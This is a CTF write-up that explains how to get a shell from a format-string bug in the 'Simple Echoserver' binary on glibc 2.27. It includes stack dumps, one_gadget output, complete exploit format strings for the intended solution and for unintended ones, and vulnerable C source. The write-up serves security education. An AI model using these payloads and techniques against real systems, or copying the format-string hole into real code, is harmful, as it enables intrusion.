# Writeup

## Overview

No special knowledge needed to solve this challenge, it is only a combination of some small tricks.   

It is obvious that sub_13C1 (loginfo) contains a format-string-vulnerability, but nothing can be leaked because stderr is redirected to /dev/null on remote server.  
Also, the format string vulnerability is only triggered once.  

The binary is x86_64 elf file and full-protected (Full RELRO + PIE + NX enabled).  
Remote environment is Ubuntu 18.04 with [glibc 2.27](http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb)  

## Intended Solution

The intend solution is to get shell with **only one use** of format string attack **without leaking** address.  

Break at 0x1415 (just before the vulnerable fprintf), the stack looks like this:

```
00:0000│ rsp  0x7fffffffe150 ◂— 0x0
01:0008│      0x7fffffffe158 —▸ 0x555555558160 (global_userinfo) ◂— 0x636261 /* 'abc' */
02:0010│ rbp  0x7fffffffe160 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— endbr64
03:0018│      0x7fffffffe168 —▸ 0x555555555443 (serve+38) ◂— lea    rdi, [rip + 0xc5b]
04:0020│      0x7fffffffe170 ◂— 0x0
... ↓
06:0030│      0x7fffffffe180 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— endbr64
07:0038│      0x7fffffffe188 —▸ 0x7ffff7dcfa00 (_IO_2_1_stdin_) ◂— 0xfbad208b
08:0040│      0x7fffffffe190 ◂— 0xd68 /* 'h\r' */
09:0048│      0x7fffffffe198 —▸ 0x7ffff7a71148 (__GI__IO_file_underflow+296) ◂— test   rax, rax
0a:0050│      0x7fffffffe1a0 ◂— 0xf705fa00
0b:0058│      0x7fffffffe1a8 ◂— 0xffffffffffffffff
0c:0060│      0x7fffffffe1b0 —▸ 0x5555555550f0 (_start) ◂— endbr64
0d:0068│      0x7fffffffe1b8 ◂— 0xa /* '\n' */
0e:0070│      0x7fffffffe1c0 —▸ 0x7fffffffe260 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— ...
0f:0078│      0x7fffffffe1c8 —▸ 0x5555555550f0 (_start) ◂— endbr64
10:0080│      0x7fffffffe1d0 —▸ 0x7fffffffe380 ◂— 0x1
11:0088│      0x7fffffffe1d8 ◂— 0x0
... ↓
13:0098│      0x7fffffffe1e8 —▸ 0x555555555348 (readlong+127) ◂— mov    rcx, qword ptr [rbp - 0x18]
14:00a0│      0x7fffffffe1f0 —▸ 0x7ffff7dcfa00 (_IO_2_1_stdin_) ◂— 0xfbad208b
15:00a8│      0x7fffffffe1f8 —▸ 0x7fffffffe203 ◂— 0xffe3800000000000
16:00b0│      0x7fffffffe200 ◂— 0x333231 /* '123' */
17:00b8│      0x7fffffffe208 —▸ 0x7fffffffe380 ◂— 0x1
18:00c0│      0x7fffffffe210 ◂— 0x0
19:00c8│      0x7fffffffe218 —▸ 0x7ffff7a723f2 (_IO_default_uflow+50) ◂— cmp    eax, -1
1a:00d0│      0x7fffffffe220 ◂— 0x36 /* '6' */
1b:00d8│      0x7fffffffe228 —▸ 0x555555558163 (global_userinfo+3) ◂— 0x0
1c:00e0│      0x7fffffffe230 —▸ 0x7fffffffe260 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— ...
1d:00e8│      0x7fffffffe238 —▸ 0x55555555528d (readline+39) ◂— mov    r12d, eax
1e:00f0│      0x7fffffffe240 ◂— 0x10055556029 /* ')`UU' */
1f:00f8│      0x7fffffffe248 ◂— 0xc700f7c4629bc400
20:0100│      0x7fffffffe250 ◂— 0x0
... ↓
22:0110│      0x7fffffffe260 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— endbr64
23:0118│      0x7fffffffe268 —▸ 0x5555555553b3 (getuserinfo+80) ◂— mov    rdx, qword ptr [rbp - 8]
24:0120│      0x7fffffffe270 —▸ 0x7fffffffe380 ◂— 0x1
25:0128│      0x7fffffffe278 ◂— 0xc700f7c4629bc400
26:0130│      0x7fffffffe280 —▸ 0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— endbr64
27:0138│      0x7fffffffe288 —▸ 0x5555555554d0 (main+30) ◂— mov    eax, 0
28:0140│      0x7fffffffe290 —▸ 0x7fffffffe380 ◂— 0x1
29:0148│      0x7fffffffe298 ◂— 0x0
2a:0150│      0x7fffffffe2a0 —▸ 0x5555555554e0 (__libc_csu_init) ◂— endbr64
2b:0158│      0x7fffffffe2a8 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax
2c:0160│      0x7fffffffe2b0 ◂— 0x1
2d:0168│      0x7fffffffe2b8 —▸ 0x7fffffffe388 —▸ 0x7fffffffe61f ◂— '/root/simple_echoserver'
2e:0170│      0x7fffffffe2c0 ◂— 0x100008000
2f:0178│      0x7fffffffe2c8 —▸ 0x5555555554b2 (main) ◂— push   rbp
30:0180│      0x7fffffffe2d0 ◂— 0x0
31:0188│      0x7fffffffe2d8 ◂— 0x224c5df7bd9bad4d
32:0190│      0x7fffffffe2e0 —▸ 0x5555555550f0 (_start) ◂— endbr64
33:0198│      0x7fffffffe2e8 —▸ 0x7fffffffe380 ◂— 0x1
34:01a0│      0x7fffffffe2f0 ◂— 0x0
... ↓
36:01b0│      0x7fffffffe300 ◂— 0x771908a2d13bad4d

```

Current call stack is main->sub_141D(serve)->sub_13C1(loginfo), and 0x7fffffffe160—>0x7fffffffe280—>0x7fffffffe2a0 is the RBP chain.  

First, we can do **stack pivot**: use %7$hhn as format string to change the lowest byte in 0x7fffffffe280. After two "leave" instructions (just before function main returns), the changed value will move into RSP.  
Now, if we can leave an one-gadget address on stack and stack pivot to there, we can get shell.  

The "field width" in format string can not only be decimal integer, but also **"\*"** or **"\*m$"** which means picking value from argument.  
So we can **pick a libc address from stack as a field width and combine with another constant field width to do an addition**, then write the result back on stack using "%n". By this method there is no need to leak address.  
(stderr is /dev/null, so write several GB bytes is fast)  

The field width and output length of printf should not overflow INT_MAX (0x7fffffff), or "%n" will fail to write. This means we can only control the lower 4 bytes by above method, so the higher 4 bytes of the origin value in "%n" target should locate in libc area.  

Notice the value in 0x7fffffffe1f8 is a pointer points to stack. It can be adjusted by controlling the input length in sub_12C9(readlong). If **the length of "Your phone: " input is 24**, its value will become 0x7fffffffe218, and 0x7fffffffe218 contains a libc address.  
Now we get **a pointer on stack that points a libc address**, and above method can be used.  

After stack pivot to 0x7fffffffe210 and rewrite 0x7fffffffe218 to one-gadget, all three default gadgets shows by ```one_gadget libc-2.27.so``` seems unsatisfied:  
```
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Use ```one_gadget -l 1 libc-2.27.so``` to search more gadgets, then find 0xe5863 is satisfied when function main returns:
```
0xe5863 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL
```

> Actually, the 0x10a38c one-gadget is also satisfied.  
> Although \[rsp+0x70\] (\[0x7fffffffe290\]) is 0x7fffffffe380, not NULL, but \[rsp+0x70\] is a readable address and \[rsp+0x78\] is NULL, then when execve "/bin/sh" is called, argv\[0\] is valid and argv\[1\] is NULL.  

Final exp: (Full script is [exp.py](./exp.py))  
```
Your name: %3c%7$hhn%357715c%*30$c%26$n
Your phone: 000000000000000000000000
```

> With this input, the stack is:  
> (break at 0x1415)  
> ```
>  7$:    02:0010│ rbp  0x7fffffffe160 —▸ 0x7fffffffe280 —▸ 0x7fffffffe2a0
> 30$:    19:00c8│      0x7fffffffe218 —▸ 0x7ffff7a72300
> 26$:    15:00a8│      0x7fffffffe1f8 —▸ 0x7fffffffe218 —▸ 0x7ffff7a72300
> ```

Success rate: 1/32  
(1/16 to guess half byte of stack address for stack pivot, 1/2 to meet the lower 4 bytes of libc address within \[0, 0x7ffffffff\] for "%n")  


## Other

Due to my carelessness, there are several unintended solutions for this challenge.  
(Only two teams use the intended solution)  

The "vfprintf" function scans format-string from left to right and handles each **immediately** without copying the arguments before it meets the **first** positional parameter ("$"), so the prior "%n" can change the later arguments.  
When "vfprintf" **firstly meets a positional parameter**, it **copies all needed arguments into an internal buffer**. After this time, the prior "%n" cannot change the later arguments anymore.  

With the "pointer to stack" value on stack (e.g. 0x7fffffffe160 —▸ 0x7fffffffe280), we can firstly change the last byte of the value to let it point to any position of stack before using "$" in format-string, then use the changed value to modify value at any stack address.  
Here is a example: (with a success rate of 1/32)  
```
Your name: %c%c%c%c%c%150c%hhn%801828c%*48$c%43$n%61c%7$hhn
```
The "%hhn" uses the 7th argument (0x7fffffffe160 —▸ 0x7fffffffe280) to change the value in 0x7fffffffe280 from 0x7fffffffe2a0 to 0x7fffffffe2a8(where stores the return address of function main).  
Then the "%\*48$c" picks the value in 0x7fffffffe2a8 (__libc_start_main_ret), and the "%43$n" uses the pointer in 0x7fffffffe280 to change the value in 0x7fffffffe2a8 to one-gadget 0xe5863.  
The last "%7$hhn" restores the value in 0x7fffffffe280 with 0x7fffffffe2a0 to keep the RBP chain correct.  

<br />  

Another method does not make use of "\*" in field width. Notice the address of function \_start is at 0x7fffffffe1c8, just do stack pivot to 0x7fffffffe1c0, the program will restart when function main returns, so we can do format-string attack repeatedly.  
In different loop, change a "pointer to stack" pointer value and partially rewrite a program address to &stderr (binary offset 0x4040), the partially rewrite stderr to stdout. Now we can leak address.  
Success rate of this method is 1/4096 (need to guess half byte of stack address, half byte of program address and half byte of libc address).  

<br />  

> If I understood such unintended solutions earlier during the event, maybe I would release a new "Simple Echoserver V2" challenge that limits the input length of "Your name: " into 32 (currently is 256) and only allows to call the vulnerable fprintf once, like this:  
> ```
> void getuserinfo(struct userinfo *info) {
> 	puts("For audit, please provide your name and phone number: ");
> 	printf("Your name: ");
> 	// readline(info->name, 256);
> 	readline(info->name, 32);    // 32 bytes is enough
> 	printf("Your phone: ");
> 	info->phone = readlong();
> }
> 
> void loginfo(struct userinfo *info) {
> 	snprintf(global_buf, BUF_LEN, "[USER] name: %s; phone: %ld\n", info->name, info->phone);
> 	fprintf(stderr, global_buf);    // vuln!
> 	stderr = NULL;    // only log once
> }
> ```
